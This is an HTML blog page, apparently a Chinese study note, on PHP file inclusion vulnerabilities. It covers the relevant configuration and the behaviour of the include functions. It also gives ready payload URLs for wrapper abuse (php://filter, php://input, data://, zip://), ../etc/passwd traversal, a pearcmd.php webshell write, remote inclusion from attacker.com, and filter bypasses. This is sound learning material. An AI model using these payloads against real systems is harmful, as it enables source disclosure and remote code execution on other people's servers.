@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Wblog
+    </title>
+    <meta name="description" content= 终身学习，记录成长轨迹 >
+    <meta name="keywords" content= Blog,Hexo,技术,学习,linxin >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="PHP文件包含漏洞-学习笔记"><a href="#PHP文件包含漏洞-学习笔记" class="headerlink" title="PHP文件包含漏洞-学习笔记"></a>PHP文件包含漏洞-学习笔记</h1><p>核心结论：PHP文件包含漏洞的本质是「文件包含函数未对用户可控文件名做严格校验」，导致攻击者可通过构造路径&#x2F;伪协议，触发文件读取、代码执行等风险，其触发与底层文件解析逻辑、PHP配置、系统特性强相关。</p>
+<h2 id="一、漏洞基础（源码视角）"><a href="#一、漏洞基础（源码视角）" class="headerlink" title="一、漏洞基础（源码视角）"></a>一、漏洞基础（源码视角）</h2><h3 id="1-核心定义"><a href="#1-核心定义" class="headerlink" title="1. 核心定义"></a>1. 核心定义</h3><p>当PHP代码中使用 <code>include</code>&#x2F;<code>require</code> 等函数，且传入的文件名由用户控制（如 <code>$_GET[&#39;file&#39;]</code>），未经过滤直接拼接路径执行时，攻击者可构造恶意路径，实现「非预期文件包含」，进而泄露源码或执行恶意代码。</p>
+<h3 id="2-关键依赖（php-ini配置）"><a href="#2-关键依赖（php-ini配置）" class="headerlink" title="2. 关键依赖（php.ini配置）"></a>2. 关键依赖（php.ini配置）</h3><p>配置项直接决定漏洞利用范围，源码层面会通过全局变量判断是否允许对应操作：</p>
+<ul>
+<li><code>allow_url_fopen=On</code>（默认开启）：允许从远程服务器读取数据（影响远程文件包含）。</li>
+<li><code>allow_url_include=On</code>（PHP5.2后默认关闭）：允许 <code>include/require</code> 远程文件（远程包含漏洞的核心开关）。</li>
+<li><code>open_basedir</code>：限制PHP可访问的目录树，源码层面会校验文件路径是否在允许范围内，是重要防御配置。</li>
+</ul>
+<h3 id="3-核心函数（源码差异）"><a href="#3-核心函数（源码差异）" class="headerlink" title="3. 核心函数（源码差异）"></a>3. 核心函数（源码差异）</h3><p>PHP文件包含函数的底层实现逻辑决定了其错误处理和重复包含特性：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>源码层面核心差异</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code></td>
+<td>加载失败仅抛出 <code>E_WARNING</code>，脚本继续执行；底层调用 <code>php_stream_open_wrapper</code> 解析路径</td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>加载失败抛出 <code>E_COMPILE_ERROR</code>，脚本终止；解析逻辑与 <code>include</code> 一致</td>
+</tr>
+<tr>
+<td><code>include_once()</code></td>
+<td>先通过 <code>zend_hash</code> 检查文件是否已包含，已包含则跳过；依赖路径解析结果去重</td>
+</tr>
+<tr>
+<td><code>require_once()</code></td>
+<td>错误处理同 <code>require</code>，去重逻辑同 <code>include_once</code></td>
+</tr>
+</tbody></table>
+<h2 id="二、漏洞触发的底层逻辑（源码拆解）"><a href="#二、漏洞触发的底层逻辑（源码拆解）" class="headerlink" title="二、漏洞触发的底层逻辑（源码拆解）"></a>二、漏洞触发的底层逻辑（源码拆解）</h2><p>以最简化漏洞代码为例，分析触发流程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-路径解析流程（源码核心步骤）"><a href="#1-路径解析流程（源码核心步骤）" class="headerlink" title="1. 路径解析流程（源码核心步骤）"></a>1. 路径解析流程（源码核心步骤）</h3><ol>
+<li>接收用户输入 <code>$_GET[&#39;file&#39;]</code>，未做任何过滤；</li>
+<li>调用底层 <code>php_stream_open_wrapper_ex</code> 函数，解析传入的路径（处理 <code>../</code>、软链接、伪协议等）；</li>
+<li>若路径合法（存在对应文件），读取文件内容并当作PHP代码执行；</li>
+<li>若路径非法（文件不存在），根据函数类型抛出对应错误。</li>
+</ol>
+<h3 id="2-漏洞触发的核心原因"><a href="#2-漏洞触发的核心原因" class="headerlink" title="2. 漏洞触发的核心原因"></a>2. 漏洞触发的核心原因</h3><ul>
+<li>源码未对用户输入做「白名单校验」：未限制仅允许包含指定目录&#x2F;文件；</li>
+<li>未过滤「路径穿越字符」：<code>../</code>、<code>./</code> 等符号未被替换，导致攻击者可跳转至任意目录；</li>
+<li>未拦截「危险伪协议」：<code>php://</code>、<code>zip://</code> 等协议未被禁止，攻击者可构造特殊流触发代码执行。</li>
+</ul>
+<h2 id="三、核心利用方式（源码-实例）"><a href="#三、核心利用方式（源码-实例）" class="headerlink" title="三、核心利用方式（源码+实例）"></a>三、核心利用方式（源码+实例）</h2><h3 id="1-伪协议利用（最常用）"><a href="#1-伪协议利用（最常用）" class="headerlink" title="1. 伪协议利用（最常用）"></a>1. 伪协议利用（最常用）</h3><p>伪协议是PHP内置的IO流，底层通过 <code>php_stream_wrapper</code> 系列函数实现解析，攻击者可利用其特性绕过限制：</p>
+<h4 id="（1）php-filter（源码读取）"><a href="#（1）php-filter（源码读取）" class="headerlink" title="（1）php:&#x2F;&#x2F;filter（源码读取）"></a>（1）php:&#x2F;&#x2F;filter（源码读取）</h4><ul>
+<li>核心逻辑：通过「过滤流」对目标文件进行编码（如base64），避免文件内容直接当作PHP代码执行，进而泄露源码；</li>
+<li>源码层面：<code>convert.base64-encode</code> 过滤器会遍历文件内容，按base64规则编码后输出，不触发代码执行；</li>
+<li>实例：<code>?file=php://filter/read=convert.base64-encode/resource=config.php</code>，解码后获取配置文件源码。</li>
+</ul>
+<h4 id="（2）php-input（代码执行）"><a href="#（2）php-input（代码执行）" class="headerlink" title="（2）php:&#x2F;&#x2F;input（代码执行）"></a>（2）php:&#x2F;&#x2F;input（代码执行）</h4><ul>
+<li>核心逻辑：读取HTTP请求的原始POST数据，若 <code>allow_url_include=On</code>，可将POST数据当作PHP代码执行；</li>
+<li>源码层面：<code>php://input</code> 对应 <code>php_stream_input</code> 流，直接返回POST原始数据，无额外过滤；</li>
+<li>实例：<code>?file=php://input</code>，POST数据传入 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code>，触发命令执行。</li>
+</ul>
+<h4 id="（3）zip-phar-（压缩包包含）"><a href="#（3）zip-phar-（压缩包包含）" class="headerlink" title="（3）zip:&#x2F;&#x2F;&#x2F;phar:&#x2F;&#x2F;（压缩包包含）"></a>（3）zip:&#x2F;&#x2F;&#x2F;phar:&#x2F;&#x2F;（压缩包包含）</h4><ul>
+<li>核心逻辑：底层支持解析压缩包内文件，攻击者可将恶意PHP文件压缩后，通过协议直接包含压缩包内的恶意代码；</li>
+<li>源码层面：<code>zip://</code> 调用 <code>php_stream_zip_open</code> 函数，解析压缩包路径（<code>#</code> 分隔压缩包与内部文件，需URL编码为 <code>%23</code>）；</li>
+<li>实例：<code>?file=zip:///var/www/upload/1.jpg%23shell.php</code>（1.jpg是包含shell.php的压缩包，后缀可伪装）。</li>
+</ul>
+<h4 id="（4）data-（直接执行代码）"><a href="#（4）data-（直接执行代码）" class="headerlink" title="（4）data:&#x2F;&#x2F;（直接执行代码）"></a>（4）data:&#x2F;&#x2F;（直接执行代码）</h4><ul>
+<li>核心逻辑：将数据当作文件内容解析，需 <code>allow_url_fopen</code> 和 <code>allow_url_include</code> 均开启；</li>
+<li>源码层面：<code>data://</code> 流直接读取传入的字符串，按指定编码（如base64）解码后执行；</li>
+<li>实例：<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code>（base64解码后为 <code>&lt;?php phpinfo(); ?&gt;</code>）。</li>
+</ul>
+<h3 id="2-路径穿越利用（目录跳转）"><a href="#2-路径穿越利用（目录跳转）" class="headerlink" title="2. 路径穿越利用（目录跳转）"></a>2. 路径穿越利用（目录跳转）</h3><ul>
+<li>核心逻辑：利用 <code>../</code>（上级目录）、<code>./</code>（当前目录）字符，绕过源码中「固定路径前缀」的限制；</li>
+<li>源码层面：PHP会调用系统 <code>realpath</code> 函数解析路径，若未过滤 <code>../</code>，则会跳转至任意目录；</li>
+<li>实例：漏洞代码 <code>include &quot;/var/www/html/&quot;.$_GET[&#39;file&#39;];</code>，攻击者构造 <code>?file=../../etc/passwd</code>，最终解析为 <code>/var/www/html/../../etc/passwd</code>，即 <code>/etc/passwd</code>，泄露系统文件。</li>
+</ul>
+<h3 id="3-临时文件包含（竞争条件）"><a href="#3-临时文件包含（竞争条件）" class="headerlink" title="3. 临时文件包含（竞争条件）"></a>3. 临时文件包含（竞争条件）</h3><ul>
+<li>核心逻辑：PHP上传文件&#x2F;处理大请求时，会生成临时文件（如 <code>/tmp/phpXXXXXX</code>），底层会在请求结束后自动删除，攻击者可通过「条件竞争」在删除前包含该文件；</li>
+<li>源码层面：临时文件由 <code>php_stream_fopen_tmpfile</code> 函数创建，文件名由随机字符生成，需通过phpinfo泄露路径或暴力猜解；</li>
+<li>典型场景：<ul>
+<li>上传文件时，临时文件在 <code>/tmp</code> 目录存在短暂窗口期；</li>
+<li><code>session.upload_progress</code> 特性（默认开启）：上传时会将进度信息写入Session文件，可通过条件竞争包含。</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-特殊场景利用（结合系统-PHP特性）"><a href="#4-特殊场景利用（结合系统-PHP特性）" class="headerlink" title="4. 特殊场景利用（结合系统&#x2F;PHP特性）"></a>4. 特殊场景利用（结合系统&#x2F;PHP特性）</h3><h4 id="（1）绕过-include-once-限制（多级软链接）"><a href="#（1）绕过-include-once-限制（多级软链接）" class="headerlink" title="（1）绕过 include_once 限制（多级软链接）"></a>（1）绕过 <code>include_once</code> 限制（多级软链接）</h4><ul>
+<li>源码层面：<code>include_once</code> 依赖「路径去重」，PHP会通过 <code>lstat</code> 函数解析路径，将软链接转换为真实路径；</li>
+<li>利用逻辑：当软链接跳转次数超过Linux <code>lstat</code> 函数的递归上限（默认约20次），解析会失败，导致真实路径与记录路径不一致，从而绕过去重；</li>
+<li>实例：<code>?file=/proc/self/root/proc/self/root/.../www/config.php</code>（重复20+次 <code>/proc/self/root</code>，最终解析路径与原始路径不同）。</li>
+</ul>
+<h4 id="（2）Windows通配符利用"><a href="#（2）Windows通配符利用" class="headerlink" title="（2）Windows通配符利用"></a>（2）Windows通配符利用</h4><ul>
+<li>核心逻辑：PHP在Windows下调用 <code>FindFirstFileExW</code> API解析文件，该API支持特殊通配符（<code>&lt;?</code> 匹配0+字符、<code>&gt;</code> 匹配1字符）；</li>
+<li>源码层面：未过滤通配符，攻击者可通过 <code>C:\Windows\Temp\php&lt;&lt;</code> 匹配临时文件名（<code>php</code> 后接随机字符）；</li>
+<li>实例：上传文件后，构造 <code>?file=C:\Windows\Temp\php&lt;&lt;</code>，包含临时文件中的恶意代码。</li>
+</ul>
+<h4 id="（3）Docker环境（pearcmd-php利用）"><a href="#（3）Docker环境（pearcmd-php利用）" class="headerlink" title="（3）Docker环境（pearcmd.php利用）"></a>（3）Docker环境（pearcmd.php利用）</h4><ul>
+<li>源码层面：Docker默认安装PEAR，<code>pearcmd.php</code> 路径固定（<code>/usr/local/lib/php/pearcmd.php</code>），且开启 <code>register_argc_argv</code> 时，可通过query-string控制命令行参数；</li>
+<li>利用逻辑：<code>pearcmd.php</code> 的 <code>config-create</code> 命令支持写入文件，攻击者通过包含该文件，构造参数写入恶意代码；</li>
+<li>实例：<code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?php system(&#39;id&#39;);?&gt;+/tmp/shell.php</code>。</li>
+</ul>
+<h2 id="四、常见绕过技巧（源码-底层逻辑）"><a href="#四、常见绕过技巧（源码-底层逻辑）" class="headerlink" title="四、常见绕过技巧（源码&#x2F;底层逻辑）"></a>四、常见绕过技巧（源码&#x2F;底层逻辑）</h2><h3 id="1-路径过滤绕过"><a href="#1-路径过滤绕过" class="headerlink" title="1. 路径过滤绕过"></a>1. 路径过滤绕过</h3><ul>
+<li>编码绕过：<code>../</code> 编码为 <code>%2e%2e%2f</code>（URL编码）、<code>%252e%252e%252f</code>（二次编码），源码层面解码后还原；</li>
+<li>容器特性：Apache Tomcat支持 <code>..%c0%af</code> 解析为 <code>../</code>，底层编码解析逻辑差异导致；</li>
+<li>长度截断：PHP&lt;5.2.8时，Windows路径最大256字节、Linux最大4096字节，重复 <code>./</code> 超出长度后，后缀会被丢弃（如 <code>?file=shell.php./././...</code>）。</li>
+</ul>
+<h3 id="2-后缀限制绕过"><a href="#2-后缀限制绕过" class="headerlink" title="2. 后缀限制绕过"></a>2. 后缀限制绕过</h3><ul>
+<li><code>%00</code> 截断：PHP&lt;5.3.4且 <code>magic_quotes_gpc=Off</code> 时，源码层面遇到 <code>%00</code>（null字节）会停止解析，如 <code>?file=shell.php%00.txt</code> 截断后缀 <code>.txt</code>；</li>
+<li>协议绕过：利用 <code>zip://</code>&#x2F;<code>phar://</code>，后缀拼接不影响协议解析（如 <code>?file=zip://test.jpg%23shell.php.txt</code>）；</li>
+<li>URL片段：<code>?file=http://attacker.com/shell.php%23.txt</code>，<code>#</code> 后内容为URL片段，源码层面解析时忽略。</li>
+</ul>
+<h3 id="3-伪协议拦截绕过"><a href="#3-伪协议拦截绕过" class="headerlink" title="3. 伪协议拦截绕过"></a>3. 伪协议拦截绕过</h3><ul>
+<li>大小写混淆：<code>PhP://FiLtEr</code>，源码层面协议解析不区分大小写；</li>
+<li>协议变种：<code>php://filter/|convert.base64-decode/resource=config.php</code>，通过过滤器组合绕过简单字符串拦截。</li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: linxin | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
